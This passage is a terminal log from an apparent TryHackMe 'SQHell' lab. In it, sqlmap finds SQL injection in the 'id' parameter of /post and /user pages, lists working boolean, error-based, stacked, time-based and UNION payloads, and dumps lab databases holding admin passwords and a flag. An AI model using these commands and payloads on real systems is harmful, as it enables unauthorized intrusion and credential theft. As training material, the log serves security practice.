+[11:10:05] [INFO] retrieved: 8
+[11:10:09] [INFO] retrieved: password           
+[11:10:09] [INFO] retrieving the length of query output
+[11:10:09] [INFO] retrieved: 8
+[11:10:13] [INFO] retrieved: username           
+[11:10:13] [INFO] fetching entries for table 'users' in database 'sqhell_3'
+[11:10:13] [INFO] fetching number of entries for table 'users' in database 'sqhell_3'
+[11:10:13] [INFO] retrieved: 1
+[11:10:14] [INFO] retrieving the length of query output
+[11:10:14] [INFO] retrieved: 1
+[11:10:16] [INFO] retrieved: 1
+[11:10:18] [INFO] retrieving the length of query output
+[11:10:18] [INFO] retrieved: 31
+[11:10:27] [INFO] retrieved: icantrememberthispasswordcanyou             
+[11:10:27] [INFO] retrieving the length of query output
+[11:10:27] [INFO] retrieved: 5
+[11:10:31] [INFO] retrieved: admin           
+Database: sqhell_3
+Table: users
+[1 entry]
++----+---------------------------------+----------+
+| id | password                        | username |
++----+---------------------------------+----------+
+| 1  | icantrememberthispasswordcanyou | admin    |
++----+---------------------------------+----------+
+
+[11:10:31] [INFO] table 'sqhell_3.users' dumped to CSV file '/root/.local/share/sqlmap/output/10.10.96.42/dump/sqhell_3/users.csv'
+[11:10:31] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.10.96.42'
+[11:10:31] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 11:10:31 /2023-04-30/
+
+                                                                                                                                     
+┌──(root㉿mrrobot)-[/home/mrrobot_h4ck3r/Documents/tryhackme/sqhell]
+┌──(root㉿mrrobot)-[/home/mrrobot_h4ck3r/Documents/tryhackme/sqhell]
+└─# sqlmap -u "http://10.10.96.42/post?id=2" -p "id" --risk=3 --level=3 --dbs --dbms=mysql --threads 10 
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.6.7#stable}
+|_ -| . [,]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 11:12:37 /2023-04-30/
+
+[11:12:37] [INFO] testing connection to the target URL
+[11:12:38] [INFO] checking if the target is protected by some kind of WAF/IPS
+[11:12:38] [INFO] testing if the target URL content is stable
+[11:12:38] [INFO] target URL content is stable
+[11:12:38] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[11:12:39] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
+[11:12:39] [INFO] testing for SQL injection on GET parameter 'id'
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (3) value? [Y/n] Y
+[11:12:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[11:12:45] [WARNING] reflective value(s) found and filtering out
+[11:12:47] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Home")
+[11:12:47] [INFO] testing 'Generic inline queries'
+[11:12:47] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[11:12:47] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[11:12:47] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[11:12:47] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[11:12:48] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[11:12:48] [INFO] GET parameter 'id' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable 
+[11:12:48] [INFO] testing 'MySQL inline queries'
+[11:12:48] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[11:12:48] [WARNING] time-based comparison requires larger statistical model, please wait.......... (done)                          
+[11:13:01] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 stacked queries (comment)' injectable 
+[11:13:01] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[11:13:11] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+[11:13:11] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[11:13:11] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[11:13:12] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[11:13:12] [INFO] target URL appears to have 4 columns in query
+[11:13:14] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
+sqlmap identified the following injection point(s) with a total of 50 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=2 AND 7413=7413
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: id=2 AND GTID_SUBSET(CONCAT(0x7178706a71,(SELECT (ELT(3791=3791,1))),0x7178766a71),3791)
+
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: id=2;SELECT SLEEP(5)#
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=2 AND (SELECT 9464 FROM (SELECT(SLEEP(5)))dZyu)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: id=-1854 UNION ALL SELECT NULL,NULL,CONCAT(0x7178706a71,0x41436f6564536f4352754a6f69715661434454434d53594467725559707a4a565446617143457372,0x7178766a71),NULL-- -
+---
+[11:13:18] [INFO] the back-end DBMS is MySQL
+[11:13:19] [WARNING] potential permission problems detected ('command denied')
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0
+back-end DBMS: MySQL >= 5.6
+[11:13:20] [INFO] fetching database names
+available databases [2]:
+[*] information_schema
+[*] sqhell_5
+
+[11:13:20] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.10.96.42'
+[11:13:20] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 11:13:20 /2023-04-30/
+
+                                                                                                                                     
+┌──(root㉿mrrobot)-[/home/mrrobot_h4ck3r/Documents/tryhackme/sqhell]
+└─# sqlmap -u "http://10.10.96.42/post?id=2" -p "id" --risk=3 --level=3 -D sqhell_5 --dump-all --dbms=mysql --threads 10 
+        ___
+       __H__                                                                                                                         
+ ___ ___["]_____ ___ ___  {1.6.7#stable}                                                                                             
+|_ -| . [,]     | .'| . |                                                                                                            
+|___|_  ["]_|_|_|__,|  _|                                                                                                            
+      |_|V...       |_|   https://sqlmap.org                                                                                         
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 11:15:14 /2023-04-30/
+
+[11:15:15] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=2 AND 7413=7413
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: id=2 AND GTID_SUBSET(CONCAT(0x7178706a71,(SELECT (ELT(3791=3791,1))),0x7178766a71),3791)
+
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: id=2;SELECT SLEEP(5)#
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=2 AND (SELECT 9464 FROM (SELECT(SLEEP(5)))dZyu)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: id=-1854 UNION ALL SELECT NULL,NULL,CONCAT(0x7178706a71,0x41436f6564536f4352754a6f69715661434454434d53594467725559707a4a565446617143457372,0x7178766a71),NULL-- -
+---
+[11:15:15] [INFO] testing MySQL
+[11:15:15] [INFO] confirming MySQL
+[11:15:16] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0
+back-end DBMS: MySQL >= 8.0.0
+[11:15:16] [INFO] fetching tables for database: 'sqhell_5'
+[11:15:16] [INFO] fetching columns for table 'users' in database 'sqhell_5'
+[11:15:16] [INFO] fetching entries for table 'users' in database 'sqhell_5'
+Database: sqhell_5
+Table: users
+[1 entry]
++----+----------+----------+
+| id | password | username |
++----+----------+----------+
+| 1  | password | admin    |
++----+----------+----------+
+
+[11:15:16] [INFO] table 'sqhell_5.users' dumped to CSV file '/root/.local/share/sqlmap/output/10.10.96.42/dump/sqhell_5/users.csv'
+[11:15:16] [INFO] fetching columns for table 'posts' in database 'sqhell_5'
+[11:15:16] [INFO] fetching entries for table 'posts' in database 'sqhell_5'
+Database: sqhell_5
+Table: posts
+[2 entries]
++----+---------+-------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| id | user_id | name        | content                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
++----+---------+-------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| 1  | 1       | First Post  | Lorem ipsum dolor sit amet, consectetur adipiscing elit. In id mollis quam. Quisque quis enim eu velit dapibus dignissim quis id dolor. Sed volutpat, magna ut venenatis egestas, diam velit hendrerit nisl, ac suscipit lacus tortor ut nisi. Vestibulum finibus leo vitae consectetur cursus. Integer ut urna nulla. Ut vulputate imperdiet consequat. Sed et est maximus, porta lectus eget, lacinia ligula. Sed tristique odio id eleifend cursus.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
+| 2  | 1       | Second Post | Etiam sit amet est in lacus ullamcorper luctus. Aliquam erat volutpat. Aliquam diam enim, consequat eget dui nec, congue porta enim. Integer venenatis dignissim erat, non elementum ante tincidunt a. Proin congue faucibus odio, at condimentum nibh hendrerit a. Sed posuere venenatis nisi, et laoreet lectus accumsan nec. Aenean sagittis eget tellus vitae volutpat. Praesent lobortis nulla eget urna aliquam, vel viverra enim pharetra. Nullam ac mauris eu erat dictum varius. Nam nulla ipsum, pretium feugiat luctus vel, condimentum et sapien. Nullam auctor pharetra volutpat. Fusce odio orci, pretium eget ligula sit amet, finibus elementum lectus. Etiam scelerisque imperdiet justo non luctus. Phasellus imperdiet odio venenatis, tempus erat eu, ultrices nisl. Morbi suscipit blandit nunc, nec accumsan elit convallis a. Donec gravida, diam sed elementum auctor, enim magna faucibus dui, a pharetra diam dui sed sapien. |
++----+---------+-------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+
+[11:15:17] [INFO] table 'sqhell_5.posts' dumped to CSV file '/root/.local/share/sqlmap/output/10.10.96.42/dump/sqhell_5/posts.csv'
+[11:15:17] [INFO] fetching columns for table 'flag' in database 'sqhell_5'
+[11:15:17] [INFO] fetching entries for table 'flag' in database 'sqhell_5'
+Database: sqhell_5
+Table: flag
+[1 entry]
++----+---------------------------------------------+
+| id | flag                                        |
++----+---------------------------------------------+
+| 1  | THM{FLAG5:B9C690D3B914F7038BA1FC65B3FDF3C8} |
++----+---------------------------------------------+
+
+[11:15:17] [INFO] table 'sqhell_5.flag' dumped to CSV file '/root/.local/share/sqlmap/output/10.10.96.42/dump/sqhell_5/flag.csv'
+[11:15:17] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.10.96.42'
+[11:15:17] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 11:15:17 /2023-04-30/
+
+                                                                                                                                     
+┌──(root㉿mrrobot)-[/home/mrrobot_h4ck3r/Documents/tryhackme/sqhell]
+└─# sqlmap -u "http://10.10.96.42/post?id=1" -p "id" --risk=3 --level=3 --dbs --dbms=mysql --threads 10
+        ___
+       __H__                                                                                                                         
+ ___ ___[']_____ ___ ___  {1.6.7#stable}                                                                                             
+|_ -| . [)]     | .'| . |                                                                                                            
+|___|_  [,]_|_|_|__,|  _|                                                                                                            
+      |_|V...       |_|   https://sqlmap.org                                                                                         
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 11:17:18 /2023-04-30/
+
+[11:17:18] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=2 AND 7413=7413
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: id=2 AND GTID_SUBSET(CONCAT(0x7178706a71,(SELECT (ELT(3791=3791,1))),0x7178766a71),3791)
+
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: id=2;SELECT SLEEP(5)#
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=2 AND (SELECT 9464 FROM (SELECT(SLEEP(5)))dZyu)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: id=-1854 UNION ALL SELECT NULL,NULL,CONCAT(0x7178706a71,0x41436f6564536f4352754a6f69715661434454434d53594467725559707a4a565446617143457372,0x7178766a71),NULL-- -
+---
+[11:17:19] [INFO] testing MySQL
+[11:17:19] [INFO] confirming MySQL
+[11:17:19] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0
+back-end DBMS: MySQL >= 8.0.0
+[11:17:19] [INFO] fetching database names
+available databases [2]:
+[*] information_schema
+[*] sqhell_5
+
+[11:17:19] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.10.96.42'
+[11:17:19] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 11:17:19 /2023-04-30/
+
+                                                                                                                                     
+┌──(root㉿mrrobot)-[/home/mrrobot_h4ck3r/Documents/tryhackme/sqhell]
+└─# sqlmap -u "http://10.10.96.42/user?id=1" -p "id" --risk=3 --level=3 --dbs --dbms=mysql --threads 10 
+        ___
+       __H__                                                                                                                         
+ ___ ___[']_____ ___ ___  {1.6.7#stable}                                                                                             
+|_ -| . [']     | .'| . |                                                                                                            
+|___|_  [']_|_|_|__,|  _|                                                                                                            
+      |_|V...       |_|   https://sqlmap.org                                                                                         
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 11:17:41 /2023-04-30/
+
+[11:17:41] [INFO] testing connection to the target URL
+[11:17:42] [INFO] checking if the target is protected by some kind of WAF/IPS
+[11:17:42] [INFO] testing if the target URL content is stable
+[11:17:42] [INFO] target URL content is stable
+[11:17:42] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
+[11:17:42] [INFO] testing for SQL injection on GET parameter 'id'
+[11:17:43] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[11:17:45] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="User")
+[11:17:45] [INFO] testing 'Generic inline queries'
+[11:17:45] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[11:17:45] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[11:17:45] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[11:17:45] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[11:17:46] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[11:17:46] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[11:17:46] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[11:17:46] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
+[11:17:46] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[11:17:47] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[11:17:47] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
+[11:17:47] [INFO] testing 'MySQL inline queries'
+[11:17:47] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[11:17:47] [WARNING] time-based comparison requires larger statistical model, please wait.... (done)                                
+[11:17:59] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 stacked queries (comment)' injectable 
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (3) value? [Y/n] Y
+[11:18:19] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[11:18:29] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+[11:18:29] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[11:18:29] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[11:18:30] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[11:18:30] [INFO] target URL appears to have 3 columns in query
+[11:18:32] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
+sqlmap identified the following injection point(s) with a total of 48 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 5443=5443
+
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: id=1;SELECT SLEEP(5)#
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1 AND (SELECT 4360 FROM (SELECT(SLEEP(5)))GyzQ)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: id=-2460 UNION ALL SELECT CONCAT(0x7176716a71,0x456c6865736556654477734b624d4a76614d66586a556d445369515a4b4b4d58794c724379674572,0x7178787a71),NULL,NULL-- -
+---
+[11:18:35] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0
+back-end DBMS: MySQL >= 5.0.12
+[11:18:36] [INFO] fetching database names
+available databases [2]:
+[*] information_schema
+[*] sqhell_4
+
+[11:18:36] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.10.96.42'
+[11:18:36] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 11:18:36 /2023-04-30/
+
+                                                                                                                                     
+┌──(root㉿mrrobot)-[/home/mrrobot_h4ck3r/Documents/tryhackme/sqhell]
+└─# sqlmap -u "http://10.10.96.42/user?id=1" -p "id" --risk=3 --level=3 -D sqhell_4 --dump-all --dbms=mysql --threads 10 
+        ___
+       __H__                                                                                                                         
+ ___ ___[(]_____ ___ ___  {1.6.7#stable}                                                                                             
+|_ -| . [,]     | .'| . |                                                                                                            
+|___|_  [,]_|_|_|__,|  _|                                                                                                            
+      |_|V...       |_|   https://sqlmap.org                                                                                         
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 11:18:57 /2023-04-30/
+
+[11:18:57] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 5443=5443
+
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: id=1;SELECT SLEEP(5)#
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1 AND (SELECT 4360 FROM (SELECT(SLEEP(5)))GyzQ)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: id=-2460 UNION ALL SELECT CONCAT(0x7176716a71,0x456c6865736556654477734b624d4a76614d66586a556d445369515a4b4b4d58794c724379674572,0x7178787a71),NULL,NULL-- -
+---
+[11:18:57] [INFO] testing MySQL
+[11:18:58] [INFO] confirming MySQL
+[11:18:58] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0
+back-end DBMS: MySQL >= 8.0.0
+[11:18:58] [INFO] fetching tables for database: 'sqhell_4'
+[11:18:58] [INFO] fetching columns for table 'users' in database 'sqhell_4'
+[11:18:59] [INFO] fetching entries for table 'users' in database 'sqhell_4'
+Database: sqhell_4
+Table: users
+[1 entry]
++----+----------+----------+
+| id | password | username |
++----+----------+----------+
+| 1  | password | admin    |
++----+----------+----------+
+
+[11:18:59] [INFO] table 'sqhell_4.users' dumped to CSV file '/root/.local/share/sqlmap/output/10.10.96.42/dump/sqhell_4/users.csv'
+[11:18:59] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.10.96.42'
+[11:18:59] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 11:18:59 /2023-04-30/
+
+                                                                                                                                     
+┌──(root㉿mrrobot)-[/home/mrrobot_h4ck3r/Documents/tryhackme/sqhell]
+└─# sqlmap -u "http://10.10.96.42/user?id=1" --headers="X-forwarded-for:1*" --risk=3 --level=5 -D sqhell_4 --dbs --dbms=mysql --threads 10 --time-sec=1
+        ___
+       __H__                                                                                                                         
+ ___ ___[,]_____ ___ ___  {1.6.7#stable}                                                                                             
+|_ -| . [)]     | .'| . |                                                                                                            
+|___|_  [(]_|_|_|__,|  _|                                                                                                            
+      |_|V...       |_|   https://sqlmap.org                                                                                         
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 11:20:29 /2023-04-30/
+
+custom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q] Y
+[11:20:33] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 5443=5443
+
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: id=1;SELECT SLEEP(1)#
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1 AND (SELECT 4360 FROM (SELECT(SLEEP(1)))GyzQ)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: id=-2460 UNION ALL SELECT CONCAT(0x7176716a71,0x456c6865736556654477734b624d4a76614d66586a556d445369515a4b4b4d58794c724379674572,0x7178787a71),NULL,NULL-- -
+---
+[11:20:33] [INFO] testing MySQL
+[11:20:33] [INFO] confirming MySQL
+[11:20:33] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0
+back-end DBMS: MySQL >= 8.0.0
+[11:20:33] [INFO] fetching database names
+available databases [2]:
+[*] information_schema
+[*] sqhell_4
+
+[11:20:33] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.10.96.42'
+[11:20:33] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 11:20:33 /2023-04-30/
+
+                                                                                                                                     
+┌──(root㉿mrrobot)-[/home/mrrobot_h4ck3r/Documents/tryhackme/sqhell]
+└─# sqlmap -u "http://10.10.96.42/user?id=1" --headers="X-forwarded-for:1*" --risk=3 --level=5 -D sqhell_4 --dbs --dbms=mysql --threads 10 --time-sec=1
+        ___
+       __H__                                                                                                                         
+ ___ ___[,]_____ ___ ___  {1.6.7#stable}                                                                                             
+|_ -| . [']     | .'| . |                                                                                                            
+|___|_  [']_|_|_|__,|  _|                                                                                                            
+      |_|V...       |_|   https://sqlmap.org                                                                                         
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 11:21:04 /2023-04-30/
+
+^Z
+zsh: suspended  sqlmap -u "http://10.10.96.42/user?id=1" --headers="X-forwarded-for:1*"   -D 
+                                                                                                                                     
+┌──(root㉿mrrobot)-[/home/mrrobot_h4ck3r/Documents/tryhackme/sqhell]
+└─# sqlmap -u "http://10.10.96.42/user?id=1" --headers="X-forwarded-for:1*" --risk=3 --level=5 --dbms=mysql --threads 10 --dbs --time-sec=1
+        ___
+       __H__                                                                                                                         
+ ___ ___[']_____ ___ ___  {1.6.7#stable}                                                                                             
+|_ -| . [.]     | .'| . |                                                                                                            
+|___|_  [(]_|_|_|__,|  _|                                                                                                            
+      |_|V...       |_|   https://sqlmap.org                                                                                         
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 11:21:19 /2023-04-30/
+
+custom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q] Y
+[11:21:29] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 5443=5443
+
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: id=1;SELECT SLEEP(1)#
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1 AND (SELECT 4360 FROM (SELECT(SLEEP(1)))GyzQ)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: id=-2460 UNION ALL SELECT CONCAT(0x7176716a71,0x456c6865736556654477734b624d4a76614d66586a556d445369515a4b4b4d58794c724379674572,0x7178787a71),NULL,NULL-- -
+---
+[11:21:30] [INFO] testing MySQL
+[11:21:30] [INFO] confirming MySQL
+[11:21:30] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0
+back-end DBMS: MySQL >= 8.0.0
+[11:21:30] [INFO] fetching database names
+available databases [2]:
+[*] information_schema
+[*] sqhell_4
+
+[11:21:30] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.10.96.42'
+[11:21:30] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 11:21:30 /2023-04-30/
+
+                                                                                                                                     
+┌──(root㉿mrrobot)-[/home/mrrobot_h4ck3r/Documents/tryhackme/sqhell]
+└─# sqlmap -u "http://10.10.96.42/user?id=1" --headers="X-forwarded-for:1*" --risk=3 --level=5 --dbms=mysql --threads 10 --dbs --time-sec=1
+        ___
+       __H__                                                                                                                         
+ ___ ___[,]_____ ___ ___  {1.6.7#stable}                                                                                             
+|_ -| . ["]     | .'| . |                                                                                                            
+|___|_  ["]_|_|_|__,|  _|                                                                                                            
+      |_|V...       |_|   https://sqlmap.org                                                                                         
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 11:21:40 /2023-04-30/
+
+custom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q] q
+[11:21:42] [ERROR] user quit
+[11:21:42] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 11:21:42 /2023-04-30/
+
+                                                                                                                                     
+┌──(root㉿mrrobot)-[/home/mrrobot_h4ck3r/Documents/tryhackme/sqhell]
